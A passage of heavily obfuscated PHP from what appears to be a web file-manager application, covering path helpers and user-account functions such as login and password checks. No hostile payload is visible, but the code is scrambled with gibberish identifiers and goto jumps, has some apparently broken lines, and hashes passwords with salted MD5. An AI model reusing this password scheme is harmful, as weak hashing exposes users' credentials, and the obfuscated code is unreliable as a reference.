$CŸ½»ëÉ²Ä[$EÛ¥ß†Ğí‘[367]]; } public static function make($E¹Üê÷Ì) { if (!$E¹Üê÷Ì) { return !1; } return self::makePath(self::KOD_SOURCE, intval($E¹Üê÷Ì)); } public static function makeShare($f¿âø¥ïß­, $C¶Ê®šÒ¨ ) { return self::makePath(self::KOD_SHARE_ITEM, $f¿âø¥ïß­, $C¶Ê®šÒ¨ ); } public static function makeFileTypePath($cåõÄ¸¶ñ¨) { return self::makePath(self::KOD_USER_FILE_TYPE, $cåõÄ¸¶ñ¨); } public static function makeFileTagPath($dÈŠƒÂ‡£î) { return self::makePath(self::KOD_USER_FILE_TAG, $dÈŠƒÂ‡£î); } public static function makePath($aÇàÓî¤êØ, $E§‰‰É´Ò¬ = '', $A°•·‚ÕÍõ = '') { $cÀº¾Ë¨èì =& $_SERVER[¼€¼ˆ¦‚¡]; $a¬×ˆ›ªÂõ = substr($aÇàÓî¤êØ, 1, -1); $d„Ïô·ñÉ = $cÀº¾Ë¨èì[1075] . $a¬×ˆ›ªÂõ . $cÀº¾Ë¨èì[1076] . $E§‰‰É´Ò¬ . $cÀº¾Ë¨èì[1077]; $d„Ïô·ñÉ = $A°•·‚ÕÍõ ? $d„Ïô·ñÉ . $A°•·‚ÕÍõ . $cÀº¾Ë¨èì[8] : $d„Ïô·ñÉ; return $d„Ïô·ñÉ; } public static function hashPath($f‰çÅäæ¬‚) { $fšÅó‡á¬Ì =& $_SERVER[¼€¼ˆ¦‚¡]; $Fˆˆ¤ÅàË = is_array($f‰çÅäæ¬‚) ? $f‰çÅäæ¬‚ : IO::info($f‰çÅäæ¬‚); $f’¯™¹¢™¨ = _get($Fˆˆ¤ÅàË, $fšÅó‡á¬Ì[1078], $fšÅó‡á¬Ì[33]); if (!$f’¯™¹¢™¨) { $DÛ¼¯‹İ´ = KodIO::parse($Fˆˆ¤ÅàË[$fšÅó‡á¬Ì[75]]); if (!$DÛ¼¯‹İ´[$fšÅó‡á¬Ì[29]]) { $f’¯™¹¢™¨ = IO::hashSimple($Fˆˆ¤ÅàË[$fšÅó‡á¬Ì[75]]); } } if (!$f’¯™¹¢™¨) { $f’¯™¹¢™¨ = md5($Fˆˆ¤ÅàË[$fšÅó‡á¬Ì[75]] . $Fˆˆ¤ÅàË[$fšÅó‡á¬Ì[77]] . $Fˆˆ¤ÅàË[$fšÅó‡á¬Ì[107]]); } return $f’¯™¹¢™¨; } public static function initSystemPath() { $C „ÉËÒ¨ =& $_SERVER[¼€¼ˆ¦‚¡]; if (defined($C „ÉËÒ¨[1079])) { return; } define($C „ÉËÒ¨[1079], self::systemPath($C „ÉËÒ¨[1080])); define($C „ÉËÒ¨[1081], self::systemPath($C „ÉËÒ¨[1082])); define($C „ÉËÒ¨[1083], self::systemPath($C „ÉËÒ¨[1084])); define($C „ÉËÒ¨[1085], self::systemPath($C „ÉËÒ¨[1086])); } private static function systemPath($EôÌà™–Ğ­) { goto b„‰é¢¨²†; Cô“•Ã’¾Ä: if ($Fİ¸í†¾±›) { return $Fİ¸í†¾±›; } if ($EôÌà™–Ğ­ == $CîÑ³İíÍí[1080]) { $Fİ¸í†¾±› = self::make(Model($CîÑ³İíÍí[749])->systemRootPathAdd($CîÑ³İíÍí[1089])); } else { $Fİ¸í†¾±› = self::systemPath($CîÑ³İíÍí[1080]); $E¸¨§Ç‰íõ = self::sourceID($Fİ¸í†¾±›); $Fİ¸í†¾±› = self::make(Model($CîÑ³İíÍí[749])->mkdir($E¸¨§Ç‰íõ, $EôÌà™–Ğ­)); } Model($CîÑ³İíÍí[1088])->set($CòÔî“Œ„, $Fİ¸í†¾±›); goto Eêºš™µÂ; Eêºš™µÂ: return $Fİ¸í†¾±›; goto CÄ˜¿³Š†Š; b„‰é¢¨²†: $CîÑ³İíÍí =& $_SERVER[¼€¼ˆ¦‚¡]; $CòÔî“Œ„ = $CîÑ³İíÍí[1087] . ucfirst($EôÌà™–Ğ­); $Fİ¸í†¾±› = Model($CîÑ³İíÍí[1088])->get($CòÔî“Œ„); goto Cô“•Ã’¾Ä; CÄ˜¿³Š†Š: } public static function systemFolder($Dìäí¥ğÓÑ) { $C‡÷¾Ÿ§« = IO_PATH_SYSTEM_SOURCE . $Dìäí¥ğÓÑ; $B´Ëçø÷¦¸ = Cache::get($C‡÷¾Ÿ§«); if (!$B´Ëçø÷¦¸) { $A“Üã·Íƒ’ = IO::infoFull($C‡÷¾Ÿ§«); if (!$A“Üã·Íƒ’) { $B´Ëçø÷¦¸ = IO::mkdir($C‡÷¾Ÿ§«, REPEAT_SKIP); } else { $B´Ëçø÷¦¸ = $A“Üã·Íƒ’[$_SERVER[¼€¼ˆ¦‚¡][75]]; } Cache::set($C‡÷¾Ÿ§«, $B´Ëçø÷¦¸, 3600 * 10); } return $B´Ëçø÷¦¸; } public static function defaultDriver() { return Model($_SERVER[¼€¼ˆ¦‚¡][700])->defaultDriver(); } public static function defaultIO() { $DË‡ÊñùÚ =& $_SERVER[¼€¼ˆ¦‚¡]; $Cà–²àÔƒ° = self::defaultDriver(); return $DË‡ÊñùÚ[1090] . $Cà–²àÔƒ°[$DË‡ÊñùÚ[367]] . $DË‡ÊñùÚ[1077]; } public static function defaultDriverInit() { static $Aˆà‡ğİ—Ş = false; if ($Aˆà‡ğİ—Ş) { return $Aˆà‡ğİ—Ş; } $Aˆà‡ğİ—Ş = IO::init(self::defaultIO()); return $Aˆà‡ğİ—Ş; } public static function fileTypeList() { $FÖôË¿­ğ… =& $_SERVER[¼€¼ˆ¦‚¡]; $e°ëôÖ·òÕ = $GLOBALS[$FÖôË¿­ğ…[6]][$FÖôË¿­ğ…[1091]]; foreach ($e°ëôÖ·òÕ as $B±‹àšİí¸ => $DÕ¶†­×İ) { $d’ĞÏ¦îÌ = $FÖôË¿­ğ…[1092] . $B±‹àšİí¸; $dæ”êÇ¤Ÿ¸ = LNG($d’ĞÏ¦îÌ); if ($d’ĞÏ¦îÌ != $dæ”êÇ¤Ÿ¸) { $e°ëôÖ·òÕ[$B±‹àšİí¸][$FÖôË¿­ğ…[28]] = $dæ”êÇ¤Ÿ¸; } } return $e°ëôÖ·òÕ; } public static function transferType($Bƒ˜¡äŞƒ, $d¬ïÖí¬ÍØ) { goto DäëÕö¦¤¥; CÁ¢Şù–»: if ($aÇÀ„‹ÁÅ[$f†ŸÁ…ÚÉ¥[29]] == $CÆåÏö–â§[$f†ŸÁ…ÚÉ¥[29]] && $aÇÀ„‹ÁÅ[$f†ŸÁ…ÚÉ¥[1093]] == $CÆåÏö–â§[$f†ŸÁ…ÚÉ¥[1093]]) { return $f†ŸÁ…ÚÉ¥[1094]; } if ($aÇÀ„‹ÁÅ[$f†ŸÁ…ÚÉ¥[29]] == $f†ŸÁ…ÚÉ¥[776] && $CÆåÏö–â§[$f†ŸÁ…ÚÉ¥[29]] == $f†ŸÁ…ÚÉ¥[102]) { return $f†ŸÁ…ÚÉ¥[1039]; } if ($aÇÀ„‹ÁÅ[$f†ŸÁ…ÚÉ¥[29]] == $f†ŸÁ…ÚÉ¥[102] && $CÆåÏö–â§[$f†ŸÁ…ÚÉ¥[29]] == $f†ŸÁ…ÚÉ¥[776]) { return $f†ŸÁ…ÚÉ¥[103]; } goto CÒ˜£°®º¶; DäëÕö¦¤¥: $f†ŸÁ…ÚÉ¥ =& $_SERVER[¼€¼ˆ¦‚¡]; $aÇÀ„‹ÁÅ = self::driverType($Bƒ˜¡äŞƒ); $CÆåÏö–â§ = self::driverType($d¬ïÖí¬ÍØ); goto CÁ¢Şù–»; CÒ˜£°®º¶: return $f†ŸÁ…ÚÉ¥[1095]; goto A„”»ÙÃô‚; A„”»ÙÃô‚: } public static function driverType($c’‹‡Õ„Ø©) { goto eŞ½­òÔ†Ğ; cîñ»Ï¢äˆ: if ($cÊÁÜÛÏÒ™ == $Dí‰ŸŞ†ë[690] || $cÊÁÜÛÏÒ™ == $Dí‰ŸŞ†ë[1097] || $cÊÁÜÛÏÒ™ == $Dí‰ŸŞ†ë[1098]) { $c’‹‡Õ„Ø© = self::defaultDriverInit(); } else { if ($cÊÁÜÛÏÒ™ == $Dí‰ŸŞ†ë[1047] || $cÊÁÜÛÏÒ™ == $Dí‰ŸŞ†ë[1099]) { $c’‹‡Õ„Ø© = IO::init($c’‹‡Õ„Ø©->pathParse[$Dí‰ŸŞ†ë[997]]); } } $cÊÁÜÛÏÒ™ = str_replace($Dí‰ŸŞ†ë[1096], $Dí‰ŸŞ†ë[33], strtolower($c’‹‡Õ„Ø©->getType())); if ($cÊÁÜÛÏÒ™ == $Dí‰ŸŞ†ë[102]) { return array($Dí‰ŸŞ†ë[29] => $Dí‰ŸŞ†ë[102], $Dí‰ŸŞ†ë[1093] => $Dí‰ŸŞ†ë[33], $Dí‰ŸŞ†ë[75] => $a ¯Ûôé÷Ù); } goto AÒ„Àî‡…‡; eŞ½­òÔ†Ğ: $Dí‰ŸŞ†ë =& $_SERVER[¼€¼ˆ¦‚¡]; $a ¯Ûôé÷Ù = $c’‹‡Õ„Ø©->path; $cÊÁÜÛÏÒ™ = str_replace($Dí‰ŸŞ†ë[1096], $Dí‰ŸŞ†ë[33], strtolower($c’‹‡Õ„Ø©->getType())); goto cîñ»Ï¢äˆ; AÒ„Àî‡…‡: return array($Dí‰ŸŞ†ë[29] => $Dí‰ŸŞ†ë[776], $Dí‰ŸŞ†ë[1093] => $c’‹‡Õ„Ø©->pathDriver, $Dí‰ŸŞ†ë[75] => $a ¯Ûôé÷Ù); goto F¯Ï›‘­Ò; F¯Ï›‘­Ò: } } goto D®ëëˆŠÏ«; bˆ°øÎ½ëó: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\56\x6a\x6f\x62\x4c\151\163\x74"; public $field = array("\x6e\141\x6d\145", "\144\145\163\x63", "\163\157\162\164"); const JOB_KEY = "\x73\x65\154\x66\112\x6f\142\x4c\151\163\x74"; public function listData($CÈíØôáù = false, $C³¡äÕéù = "\163\x6f\162\164", $DÕäƒ†²Çù = false) { return parent::listData($CÈíØôáù, $C³¡äÕéù, $DÕäƒ†²Çù); } public function remove($a¹³Õ“ˆ) { return parent::remove($a¹³Õ“ˆ); } public function add($D‚¦ßÔ÷òã) { $c¬Ãìéï”‡ =& $_SERVER[¼€¼ˆ¦‚¡]; if ($this->findByName($D‚¦ßÔ÷òã[$c¬Ãìéï”‡[28]])) { return !1; } $D‚¦ßÔ÷òã[$c¬Ãìéï”‡[2126]] = $this->getSort(); return parent::insert($D‚¦ßÔ÷òã); } private function getSort() { $bÅ†¦Û¾ê‚ =& $_SERVER[¼€¼ˆ¦‚¡]; $EÔÇ©î¸á¤ = parent::listData(); $a†ö„Ôå¤Õ = array_to_keyvalue($EÔÇ©î¸á¤, $bÅ†¦Û¾ê‚[33], $bÅ†¦Û¾ê‚[2126]); return empty($a†ö„Ôå¤Õ) ? 0 : max($a†ö„Ôå¤Õ) + 1; } public function update($c‚µäÊ¾©’, $Bé…¡ÕÖñ¢) { $a…ÊóÅŞÈÈ =& $_SERVER[¼€¼ˆ¦‚¡]; $FŸ­¬…İóÇ = parent::listData($c‚µäÊ¾©’); $bˆœ²‡‘‚ = $this->findByName($Bé…¡ÕÖñ¢[$a…ÊóÅŞÈÈ[28]]); if (!$FŸ­¬…İóÇ || $bˆœ²‡‘‚ && $bˆœ²‡‘‚[$a…ÊóÅŞÈÈ[367]] != $FŸ­¬…İóÇ[$a…ÊóÅŞÈÈ[367]]) { return !1; } return parent::update($c‚µäÊ¾©’, $Bé…¡ÕÖñ¢); } public function setUserJob($DÙ¯ö‰šÜÈ, $aÎÙÅ®›×¼) { goto FË®’Ø©™; Fß Áãáâ±: $dÈÏÅÉ¸ö‘ = array_to_keyvalue($AáÛ¼ÛÈ¡š, $fçµ´…‹À[28]); $DÖ‹ø¤ÂÊ† = $fçµ´…‹À[361]; foreach ($aÎÙÅ®›×¼ as $fò¾â²ÃË) { if ($dÈÏÅÉ¸ö‘[$fò¾â²ÃË]) { $DÖ‹ø¤ÂÊ† .= $dÈÏÅÉ¸ö‘[$fò¾â²ÃË][$fçµ´…‹À[367]] . $fçµ´…‹À[47]; } else { $CËá’İË¨İ = $this->add($fò¾â²ÃË); $DÖ‹ø¤ÂÊ† .= $CËá’İË¨İ . $fçµ´…‹À[47]; } } goto dßˆ¹¾¸ªƒ; dßˆ¹¾¸ªƒ: $DÖ‹ø¤ÂÊ† = rtrim($DÖ‹ø¤ÂÊ†, $fçµ´…‹À[47]); Model($fçµ´…‹À[477])->metaSet($DÙ¯ö‰šÜÈ, self::JOB_KEY, $DÖ‹ø¤ÂÊ†); goto cÅššâÉí; FË®’Ø©™: $fçµ´…‹À =& $_SERVER[¼€¼ˆ¦‚¡]; if (!is_array($aÎÙÅ®›×¼)) { $aÎÙÅ®›×¼ = array($aÎÙÅ®›×¼); } $AáÛ¼ÛÈ¡š = parent::listData(); goto Fß Áãáâ±; cÅššâÉí: } public function getUserJob($FºÆÏø—è«) { $d—„«’Ÿä = Model($_SERVER[¼€¼ˆ¦‚¡][477])->metaGet($FºÆÏø—è«); return $this->getUserJobInfo($d—„«’Ÿä[self::JOB_KEY]); } public function getUserJobInfo($d ‘ÂÓ²İ) { goto Dà¦»ÏÒá›; cˆï¾Ú¥ëÍ: return $EÄÙçš©; goto FÆÀ¼Àâ”Â; Dà¦»ÏÒá›: $A¬¸š„©îè =& $_SERVER[¼€¼ˆ¦‚¡]; $Dª¾õÇ©Å = explode($A¬¸š„©îè[47], $d ‘ÂÓ²İ); $dËâµ¿â”‡ = parent::listData(); goto c’¿ Ğ‡ŒŠ; c’¿ Ğ‡ŒŠ: $dËâµ¿â”‡ = array_remove_key($dËâµ¿â”‡, $A¬¸š„©îè[187]); $EÄÙçš© = array(); foreach ($Dª¾õÇ©Å as $C¾ùÀÓººâ) { if (isset($dËâµ¿â”‡[$C¾ùÀÓººâ])) { $EÄÙçš©[] = $dËâµ¿â”‡[$C¾ùÀÓººâ]; } } goto cˆï¾Ú¥ëÍ; FÆÀ¼Àâ”Â: } } class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\x72"; protected $tableMeta = array("\x74\141\142\154\x65\x4e\x61\155\145" => "\x75\x73\x65\x72\x5f\155\145\x74\141", "\155\145\164\141\x46\x69\x65\x6c\144" => "\165\163\145\162\111\104"); protected $simpleField = "\x75\x73\145\162\111\x44\54\x6e\151\x63\153\x4e\x61\x6d\145\54\156\141\x6d\x65\x2c\x61\x76\x61\x74\x61\x72\x2c\x73\145\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($CäõÎ”»œ) { $fŸÖ‡ç·œ =& $_SERVER[¼€¼ˆ¦‚¡]; $a”Ó©ÌùŠ = $fŸÖ‡ç·œ[2495]; return array($fŸÖ‡ç·œ[2171] => array($CäõÎ”»œ[0], $a”Ó©ÌùŠ), $fŸÖ‡ç·œ[2173] => array($CäõÎ”»œ[0], $a”Ó©ÌùŠ), $fŸÖ‡ç·œ[2496] => array($CäõÎ”»œ[0], $a”Ó©ÌùŠ)); } protected function getInfo($dÖº¾Ó, $bÑçŠîŠÜ‚ = false) { $a‘‚ò–íŒ‡ = $this->getInfoSimple($dÖº¾Ó); if (!is_array($a‘‚ò–íŒ‡)) { return array(); } if ($bÑçŠîŠÜ‚) { return $this->_getInfoApply($a‘‚ò–íŒ‡); } return $this->cacheFunctionGet($_SERVER[¼€¼ˆ¦‚¡][2216], $dÖº¾Ó); } protected function getInfoFull($aï¿êÃàòÍ, $döÇ„‡àí = false) { $DßÆ¿øËÔ = $this->getInfoSimple($aï¿êÃàòÍ); if (!is_array($DßÆ¿øËÔ)) { return array(); } if ($döÇ„‡àí) { return $this->_getInfoApply($DßÆ¿øËÔ, !0); return $this->_getInfoApply($DßÆ¿øËÔ, !0); } return $this->cacheFunctionGet($_SERVER[¼€¼ˆ¦‚¡][2497], $aï¿êÃàòÍ); } private function _getInfoApply($D‰´ö”ñÓ•, $Dô®‰ô‘Ş = false) { goto a»÷À˜¿§í; a¨´ˆâÙ¹¿: $D‰´ö”ñÓ•[$CÓ«âƒÎƒï[391]][$CÓ«âƒÎƒï[2333]] = isset($DåÑÜÃ¢ê[$CÓ«âƒÎƒï[2334]]) ? $DåÑÜÃ¢ê[$CÓ«âƒÎƒï[2334]] : null; if ($Dô®‰ô‘Ş) { $D‰´ö”ñÓ•[$CÓ«âƒÎƒï[417]] = $this->metaGet($D‰´ö”ñÓ•[$CÓ«âƒÎƒï[1437]]); } return $D‰´ö”ñÓ•; goto Eª²òô–·’; a»÷À˜¿§í: $CÓ«âƒÎƒï =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$D‰´ö”ñÓ•) { return $D‰´ö”ñÓ•; } $B¼˜¡…ñÕù = md5($CÓ«âƒÎƒï[2498] . $D‰´ö”ñÓ•[$CÓ«âƒÎƒï[801]] . $CÓ«âƒÎƒï[2499] . $D‰´ö”ñÓ•[$CÓ«âƒÎƒï[28]]); goto dàµ£“²; dàµ£“²: $D‰´ö”ñÓ• = $this->_listDataApplyItem($D‰´ö”ñÓ•); $DåÑÜÃ¢ê = Model($CÓ«âƒÎƒï[1117])->metaGet($D‰´ö”ñÓ•[$CÓ«âƒÎƒï[391]][$CÓ«âƒÎƒï[369]]); $D‰´ö”ñÓ•[$CÓ«âƒÎƒï[2500]] = $B¼˜¡…ñÕù; goto a¨´ˆâÙ¹¿; Eª²òô–·’: } protected function getInfoSimple($Bœ°‹„Ñö, $Fµ‘Û‚œ·õ = false) { $bòˆ‘’²Èá =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$Bœ°‹„Ñö) { return array(); } if ($Fµ‘Û‚œ·õ) { $B¤¶¤êë¥È = $this->where(array($bòˆ‘’²Èá[1437] => intval($Bœ°‹„Ñö)))->find(); if (!is_array($B¤¶¤êë¥È)) { return array(); } $B¤¶¤êë¥È[$bòˆ‘’²Èá[2501]] = Action($bòˆ‘’²Èá[2502])->parseUrl($B¤¶¤êë¥È[$bòˆ‘’²Èá[2501]]); return $B¤¶¤êë¥È; } return $this->cacheFunctionGet($bòˆ‘’²Èá[2174], $Bœ°‹„Ñö); } protected function getInfoSimpleOuter($cŒÚÅŠè…) { goto A° ÕÕÜáë; A° ÕÕÜáë: $cå³³Ôó™“ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$cŒÚÅŠè… || $cŒÚÅŠè… == 0) { return array($cå³³Ôó™“[1437] => $cå³³Ôó™“[468], $cå³³Ôó™“[28] => $cå³³Ôó™“[157] . LNG($cå³³Ôó™“[2503]) . $cå³³Ôó™“[476], $cå³³Ôó™“[2501] => STATIC_PATH . $cå³³Ôó™“[2504]); } $e×ö§‡Ô•å = $this->cacheFunctionGet($cå³³Ôó™“[2174], $cŒÚÅŠè…); goto Fù‹ºò–Æ†; E§éè„®Õ¯: return $D¶ùË–Š»Ø; goto cÅÇå½èÂ; Fù‹ºò–Æ†: $D¶ùË–Š»Ø = array_field_key($e×ö§‡Ô•å, explode($cå³³Ôó™“[47], $this->simpleField)); if (!$D¶ùË–Š»Ø) { return array($cå³³Ôó™“[1437] => $cå³³Ôó™“[1030], $cå³³Ôó™“[28] => $cå³³Ôó™“[157] . LNG($cå³³Ôó™“[2505]) . $cå³³Ôó™“[476], $cå³³Ôó™“[2501] => STATIC_PATH . $cå³³Ôó™“[2506]); } $D¶ùË–Š»Ø[$cå³³Ôó™“[2501]] = Action($cå³³Ôó™“[2502])->parseUrl($D¶ùË–Š»Ø[$cå³³Ôó™“[2501]]); goto E§éè„®Õ¯; cÅÇå½èÂ: } protected function groupUser($dè‰¸…†§’) { } public static function errorLang($bŠœ„š¾åÕ) { $d³¦»ù§Á =& $_SERVER[¼€¼ˆ¦‚¡]; $c¬Üå­æö” = array(self::ERROR_USER_NOT_EXISTS => $d³¦»ù§Á[2507], self::ERROR_USER_PASSWORD_ERROR => $d³¦»ù§Á[2508], self::ERROR_USER_EXIST_NAME => $d³¦»ù§Á[2509], self::ERROR_USER_EXIST_PHONE => $d³¦»ù§Á[2510], self::ERROR_USER_EXIST_EMAIL => $d³¦»ù§Á[2511], self::ERROR_USER_LOGIN_LOCK => $d³¦»ù§Á[2512], self::ERROR_IP_NOT_ALLOW => $d³¦»ù§Á[2513], self::ERROR_USER_EXIST_NICKNAME => $d³¦»ù§Á[2514]); return LNG($c¬Üå­æö”[$bŠœ„š¾åÕ]); } public function getInfoByMeta($EÀ…İ¾£¿•, $B—„ŠÑ‘Ú¡) { $FÏ¬°ŒĞ‹ =& $_SERVER[¼€¼ˆ¦‚¡]; $f†ŞÈØ¢â = Model($FÏ¬°ŒĞ‹[2515])->where(array($FÏ¬°ŒĞ‹[89] => $EÀ…İ¾£¿•, $FÏ¬°ŒĞ‹[359] => $B—„ŠÑ‘Ú¡))->find(); if ($f†ŞÈØ¢â) { return $this->getInfo($f†ŞÈØ¢â[$FÏ¬°ŒĞ‹[1437]]); } return !1; } public function userLoginCheck($B“Ñ¬Ÿ£·İ, $cÌåÓ¸¡Æ) { goto BÙß¢ƒ³ ˆ; BÙß¢ƒ³ ˆ: $eª«™ããå =& $_SERVER[¼€¼ˆ¦‚¡]; $fĞĞÎ²á­Ë = array($eª«™ããå[28] => $B“Ñ¬Ÿ£·İ, $eª«™ããå[2337] => $B“Ñ¬Ÿ£·İ, $eª«™ããå[293] => $B“Ñ¬Ÿ£·İ, $eª«™ããå[2516] => $B“Ñ¬Ÿ£·İ, $eª«™ããå[913] => $eª«™ããå[915]); if ($this->nickNameRpt()) { unset($fĞĞÎ²á­Ë[$eª«™ããå[2337]]); } goto eî—„ÎÑˆÉ; B§ÜÉİŒ©â: $this->userEdit($f÷ô‰ÙøÎ§[$eª«™ããå[1437]], array($eª«™ããå[2517] => time())); return $this->getInfo($f÷ô‰ÙøÎ§[$eª«™ããå[1437]]); goto A£¨ìàŒ‡; eî—„ÎÑˆÉ: $f÷ô‰ÙøÎ§ = $this->where($fĞĞÎ²á­Ë)->find(); if (!$f÷ô‰ÙøÎ§) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($f÷ô‰ÙøÎ§[$eª«™ããå[1437]], $cÌåÓ¸¡Æ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto B§ÜÉİŒ©â; A£¨ìàŒ‡: } public function clearCache($aŒñÊ‚Ü£á) { $b…½ë„ø¥ =& $_SERVER[¼€¼ˆ¦‚¡]; $this->cacheFunctionClear($b…½ë„ø¥[2216], $aŒñÊ‚Ü£á); $this->cacheFunctionClear($b…½ë„ø¥[2174], $aŒñÊ‚Ü£á); $this->cacheFunctionClear($b…½ë„ø¥[2497], $aŒñÊ‚Ü£á); } public function userPasswordCheck($f¯×»ÁÃö, $e©‹†‰×ª) { $Bƒ°¿Í©¯ =& $_SERVER[¼€¼ˆ¦‚¡]; $C²¶°÷ÑË¶ = $this->where(array($Bƒ°¿Í©¯[1437] => intval($f¯×»ÁÃö)))->find(); $d¿áÆ§ÂÑ = $this->metaGet($f¯×»ÁÃö); $d™®‚‡İâ = isset($d¿áÆ§ÂÑ[$Bƒ°¿Í©¯[2518]]) ? $d¿áÆ§ÂÑ[$Bƒ°¿Í©¯[2518]] : $Bƒ°¿Í©¯[33]; if (md5($d™®‚‡İâ . trim($e©‹†‰×ª)) !== $C²¶°÷ÑË¶[$Bƒ°¿Í©¯[801]]) { return !1; } return !0; } public function userAdd($b‰º°¥ì‡²) { goto A‰¥Üæß¢ñ; CÆ‰ÁŒœ’ñ: $A‚ŞÜ£İ‰í = array($bŒÎ®„ĞŠã[2526] => $dë¥İ«ô [$bŒÎ®„ĞŠã[801]], $bŒÎ®„ĞŠã[2522] => $dë¥İ«ô [$bŒÎ®„ĞŠã[2337]]); $this->userEdit($cç¡¾âß¾ô, $A‚ŞÜ£İ‰í); Model($bŒÎ®„ĞŠã[1117])->userRootAdd($cç¡¾âß¾ô); goto bæß×¿®Ì±; e‹…ä‰³•: $Aœ½Ğ’¥ˆ = $this->_checkExist($b‰º°¥ì‡²); if ($Aœ½Ğ’¥ˆ !== !0) { return $Aœ½Ğ’¥ˆ; } $cç¡¾âß¾ô = $this->add($dë¥İ«ô ); goto CÆ‰ÁŒœ’ñ; A‰¥Üæß¢ñ: $bŒÎ®„ĞŠã =& $_SERVER[¼€¼ˆ¦‚¡]; $dë¥İ«ô  = array($bŒÎ®„ĞŠã[386] => $b‰º°¥ì‡²[$bŒÎ®„ĞŠã[28]], $bŒÎ®„ĞŠã[2519] => $b‰º°¥ì‡²[$bŒÎ®„ĞŠã[1322]], $bŒÎ®„ĞŠã[2520] => isset($b‰º°¥ì‡²[$bŒÎ®„ĞŠã[293]]) ? $b‰º°¥ì‡²[$bŒÎ®„ĞŠã[293]] : $bŒÎ®„ĞŠã[33], $bŒÎ®„ĞŠã[2521] => isset($b‰º°¥ì‡²[$bŒÎ®„ĞŠã[2516]]) ? $b‰º°¥ì‡²[$bŒÎ®„ĞŠã[2516]] : $bŒÎ®„ĞŠã[33], $bŒÎ®„ĞŠã[2522] => isset($b‰º°¥ì‡²[$bŒÎ®„ĞŠã[2337]]) ? $b‰º°¥ì‡²[$bŒÎ®„ĞŠã[2337]] : $b‰º°¥ì‡²[$bŒÎ®„ĞŠã[28]], $bŒÎ®„ĞŠã[2523] => isset($b‰º°¥ì‡²[$bŒÎ®„ĞŠã[2501]]) ? $b‰º°¥ì‡²[$bŒÎ®„ĞŠã[2501]] : $bŒÎ®„ĞŠã[33], $bŒÎ®„ĞŠã[2524] => isset($b‰º°¥ì‡²[$bŒÎ®„ĞŠã[2525]]) ? $b‰º°¥ì‡²[$bŒÎ®„ĞŠã[2525]] : 1, $bŒÎ®„ĞŠã[2526] => $b‰º°¥ì‡²[$bŒÎ®„ĞŠã[801]], $bŒÎ®„ĞŠã[2175] => isset($b‰º°¥ì‡²[$bŒÎ®„ĞŠã[2089]]) ? $b‰º°¥ì‡²[$bŒÎ®„ĞŠã[2089]] : 1024 * 1024 * 20, $bŒÎ®„ĞŠã[2176] => 0, $bŒÎ®„ĞŠã[2517] => 0, $bŒÎ®„ĞŠã[2203] => isset($b‰º°¥ì‡²[$bŒÎ®„ĞŠã[685]]) ? $b‰º°¥ì‡²[$bŒÎ®„ĞŠã[685]] : 1); if (!empty($b‰º°¥ì‡²[$bŒÎ®„ĞŠã[1437]])) { $dë¥İ«ô [$bŒÎ®„ĞŠã[1437]] = $b‰º°¥ì‡²[$bŒÎ®„ĞŠã[1437]]; } goto e‹…ä‰³•; bæß×¿®Ì±: return $cç¡¾âß¾ô; goto D®¾–£„¬„; D®¾–£„¬„: } protected function userEditTest($e“Ç­íÓÅ, $EîÆ°ˆôåÄ) { return $this->call($_SERVER[¼€¼ˆ¦‚¡][2527], $e“Ç­íÓÅ, $EîÆ°ˆôåÄ); } protected function userEdit($dÁåáÒİİ«, $dÑ‡šèĞÏ) { goto C”øÍŠ ¶Ò; C”øÍŠ ¶Ò: $FéËÌÇ‰½­ =& $_SERVER[¼€¼ˆ¦‚¡]; $dˆÍ¹İ¹Á = $this->getInfoSimple($dÁåáÒİİ«); if (!$dˆÍ¹İ¹Á) { return !1; } goto Dï½ê²Ê¤; Dï½ê²Ê¤: $BÍ„‹ÌÆ‘Š = $this->_checkExist($dÑ‡šèĞÏ, $dÁåáÒİİ«); if ($BÍ„‹ÌÆ‘Š !== !0) { return $BÍ„‹ÌÆ‘Š; } if (isset($dÑ‡šèĞÏ[$FéËÌÇ‰½­[801]]) && trim($dÑ‡šèĞÏ[$FéËÌÇ‰½­[801]]) != $FéËÌÇ‰½­[33]) { $F¤İæàĞ¤œ = $this->metaGet($dÁåáÒİİ«); if (empty($F¤İæàĞ¤œ[$FéËÌÇ‰½­[2518]])) { $F¤İæàĞ¤œ[$FéËÌÇ‰½­[2518]] = rand_string(10); Model($FéËÌÇ‰½­[474])->metaSet($dÁåáÒİİ«, $FéËÌÇ‰½­[2518], $F¤İæàĞ¤œ[$FéËÌÇ‰½­[2518]]); } $dÑ‡šèĞÏ[$FéËÌÇ‰½­[801]] = md5($F¤İæàĞ¤œ[$FéËÌÇ‰½­[2518]] . trim($dÑ‡šèĞÏ[$FéËÌÇ‰½­[801]])); } else { unset($dÑ‡šèĞÏ[$FéËÌÇ‰½­[801]]); } goto c‹•‹×”äæ; d¼è§šŠÃÜ: return !0; goto bøš‰ËÓ¢ø; c‹•‹×”äæ: $this->where(array($FéËÌÇ‰½­[1428] => $dÁåáÒİİ«))->save($dÑ‡šèĞÏ); if (isset($dÑ‡šèĞÏ[$FéËÌÇ‰½­[2337]])) { $this->setNamePinyin($dÁåáÒİİ«, $dÑ‡šèĞÏ[$FéËÌÇ‰½­[2337]]); } $this->clearCache($Ašª¨Ö„¨[$FéËÌÇ‰½­[1437]]); goto d¼è§šŠÃÜ; bøš‰ËÓ¢ø: } public function setNamePinyin($a®‘­Ëº, $Cö¸ Ÿ¿«Ñ = false) { $fØ­¦£½‰ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$Cö¸ Ÿ¿«Ñ) { $F»İ²Ñô = $this->getInfoSimple($a®‘­Ëº); $Cö¸ Ÿ¿«Ñ = $F»İ²Ñô[$fØ­¦£½‰[2337]] ? $F»İ²Ñô[$fØ­¦£½‰[2337]] : $F»İ²Ñô[$fØ­¦£½‰[28]]; } $dˆìËÅòš = Model($fØ­¦£½‰[477]); if 